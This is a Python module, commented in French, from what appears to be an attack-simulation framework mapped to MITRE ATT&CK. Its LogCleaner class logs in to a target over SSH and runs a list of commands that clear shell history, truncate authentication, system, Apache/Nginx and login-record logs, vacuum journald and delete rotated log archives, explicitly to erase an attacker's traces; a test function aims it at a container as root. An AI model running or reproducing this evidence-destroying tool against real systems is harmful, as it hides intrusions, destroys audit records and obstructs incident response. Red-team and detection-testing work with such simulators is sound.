#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Fri May 22 06:47:18 2026

@author: hounsousamuel
"""

import os
import sys
sys.path.insert(1, os.path.dirname(os.path.abspath(os.path.join(__file__, "..", ".."))))

import time
import asyncio
from typing import Dict, Any, Optional

from tactics.execution.command_execution import CommandExecution
from tactics.mittres import MITRE
from simulateur_utils.logger import get_logger

logger = get_logger()


class LogCleaner(CommandExecution):
    """
    Efface les traces de l'attaquant sur la machine cible.

    Cette classe permet de nettoyer les traces laissées par l'attaquant :
        - Historique bash / zsh / history
        - Logs d'authentification (auth.log, secure, faillog)
        - Logs système (syslog, messages, daemon.log, kern.log, boot.log)
        - Logs applicatifs (Apache, Nginx)
        - Fichiers wtmp / btmp / lastlog
        - Logs journald (systemd)
        - Archives de logs rotées (.gz, .1, .old)

    Attributes:
        commands (List[str]): Liste des commandes de nettoyage à exécuter.
        clean_result (Dict): Résultat de l'opération de nettoyage.
    """

    def __init__(
        self,
        name: str = "log_cleaner",
        timeout: int = 2,
        exec_timeout: int = 10,
        **kwargs
    ):
        """
        Initialise le nettoyeur de logs.

        Args:
            name (str): Nom de l'instance. Par défaut "log_cleaner".
            timeout (int): Timeout de connexion SSH en secondes.
            exec_timeout (int): Timeout d'exécution des commandes en secondes.
            **kwargs: Arguments supplémentaires transmis à CommandExecution.
        """
        super().__init__(name=name, timeout=timeout, exec_timeout=exec_timeout, **kwargs)
        self.clean_result: Dict[str, Any] = {}

    async def _clean_async(
        self,
        ip: str,
        port: int,
        username: str,
        password: str,
        pkey=None
    ) -> Dict[str, Any]:
        """
        Implémentation interne du nettoyage des logs.

        Args:
            ip (str): IP de la cible.
            port (int): Port SSH.
            username (str): Nom d'utilisateur.
            password (str): Mot de passe.

        Returns:
            Dict[str, Any]: Résultat formaté du nettoyage.
        """
        self.log(f"Début LogCleaner sur {username}@{ip}:{port}", log=True)
        self.start_time = time.time()

        commands = [
            # --- Shell history ---
            "history -c 2>/dev/null || true",
            "cat /dev/null > ~/.bash_history 2>/dev/null || true",
            "cat /dev/null > ~/.zsh_history 2>/dev/null || true",
            "cat /dev/null > ~/.history 2>/dev/null || true",
            "cat /dev/null > ~/.bash_logout 2>/dev/null || true",

            # --- Auth logs ---
            "cat /dev/null > /var/log/auth.log 2>/dev/null || true",
            "cat /dev/null > /var/log/secure 2>/dev/null || true",
            "cat /dev/null > /var/log/faillog 2>/dev/null || true",

            # --- System logs ---
            "cat /dev/null > /var/log/syslog 2>/dev/null || true",
            "cat /dev/null > /var/log/messages 2>/dev/null || true",
            "cat /dev/null > /var/log/daemon.log 2>/dev/null || true",
            "cat /dev/null > /var/log/kern.log 2>/dev/null || true",
            "cat /dev/null > /var/log/boot.log 2>/dev/null || true",

            # --- Application logs ---
            "cat /dev/null > /var/log/apache2/access.log 2>/dev/null || true",
            "cat /dev/null > /var/log/apache2/error.log 2>/dev/null || true",
            "cat /dev/null > /var/log/nginx/access.log 2>/dev/null || true",
            "cat /dev/null > /var/log/nginx/error.log 2>/dev/null || true",

            # --- Lastlog / wtmp / btmp ---
            "cat /dev/null > /var/log/wtmp 2>/dev/null || true",
            "cat /dev/null > /var/log/btmp 2>/dev/null || true",
            "cat /dev/null > /var/log/lastlog 2>/dev/null || true",

            # --- Journald (systemd logs) ---
            "journalctl --rotate 2>/dev/null || true",
            "journalctl --vacuum-time=1s 2>/dev/null || true",

            # --- Supprimer les archives de logs rotées ---
            "rm -f /var/log/*.gz 2>/dev/null || true",
            "rm -f /var/log/*.1 2>/dev/null || true",
            "rm -f /var/log/*.old 2>/dev/null || true",
        ]

        self.log(f"Exécution de {len(commands)} commandes de nettoyage", log=True)

        exec_result = await self.exec_command_async(
            ip=ip,
            port=port,
            username=username,
            password=password,
            commands=commands,
            pkey=pkey
        )

        self.end_time = time.time()
        self.clean_result = exec_result
        self.log(f"Fin LogCleaner — nettoyage terminé en {self.end_time - self.start_time:.2f}s", log=True)

        return self.log_cleaner_get_result()

    async def clean_async(
        self,
        ip: str,
        port: int,
        username: str,
        password: str,
        pkey=None,
        total_timeout: Optional[float] = None,
    ) -> Dict[str, Any]:
        """
        Version asynchrone avec timeout global optionnel.

        Args:
            ip (str): IP de la cible.
            port (int): Port SSH.
            username (str): Nom d'utilisateur.
            password (str): Mot de passe.
            total_timeout (Optional[float]): Timeout global en secondes.

        Returns:
            Dict[str, Any]: Résultat formaté du nettoyage.
        """
        if total_timeout:
            try:
                async with asyncio.timeout(total_timeout):
                    return await self._clean_async(ip, port, username, password, pkey=pkey)
            except asyncio.TimeoutError:
                self.log(f"Timeout après {total_timeout}s", log=True)
                return self.log_cleaner_get_result()
        return await self._clean_async(ip, port, username, password, pkey=pkey)

    def clean_sync(self, *args, **kwargs) -> Dict[str, Any]:
        """
        Version synchrone de clean_async.

        Returns:
            Dict[str, Any]: Résultat formaté du nettoyage.
        """
        return asyncio.run(self.clean_async(*args, **kwargs))

    def log_cleaner_get_result(self) -> Dict[str, Any]:
        """
        Génère le résultat formaté du nettoyage.

        Returns:
            Dict[str, Any]: Résultat formaté contenant :
                - severity (str): Niveau de sévérité ("LOW")
                - elapsed (float): Temps écoulé en secondes
                - mitres (List): Références MITRE ATT&CK
                - results (Dict): Détails des commandes exécutées
        """
        self.save()

        mitres = [MITRE.get("LogCleaning", {})]

        results = self.clean_result.get("results", {})

        return {
            'severity': 'LOW',
            'elapsed': self.end_time - self.start_time if self.end_time and self.start_time else 0,
            "mitres": mitres,
            'results': {
                "commands": results.get("commands", {}),
                "success_number": results.get("success_number", 0),
                "success_rate": results.get("success_rate", 0.0),
            },
        }


# =============================================================================
# Fonction de test
# =============================================================================

def test_log_cleaner(
    ip: str = "172.17.0.2",
    port: int = 22,
    username: str = "root",
    password: str = "toor",
    total_timeout: float = 60.0,
    pkey=None
):
    """
    Teste la classe LogCleaner sur une cible.

    Args:
        ip (str): IP de la cible.
        port (int): Port SSH.
        username (str): Nom d'utilisateur.
        password (str): Mot de passe.
        total_timeout (float): Timeout total en secondes.
    """
    print(f"\n🧹 Test LogCleaner sur {username}@{ip}:{port}")
    print("-" * 50)

    cleaner = LogCleaner(timeout=5, exec_timeout=10)

    result = cleaner.clean_sync(
        ip=ip,
        port=port,
        username=username,
        password=password,
        total_timeout=total_timeout,
        pkey=pkey
    )

    severity = result.get("severity", "UNKNOWN")
    elapsed = result.get("elapsed", 0)
    results = result.get("results", {})
    success_number = results.get("success_number", 0)
    success_rate = results.get("success_rate", 0)

    severity_icon = {"LOW": "🟢", "MEDIUM": "🟡", "HIGH": "🔴"}.get(severity, "⚪")

    print(f"\n{severity_icon} Sévérité : {severity}")
    print(f"⏱️  Temps : {elapsed:.2f}s")
    print(f"📊 Commandes exécutées : {success_number}")
    print(f"📈 Taux de succès : {success_rate:.2%}")

    return result


if __name__ == "__main__":
    test_log_cleaner()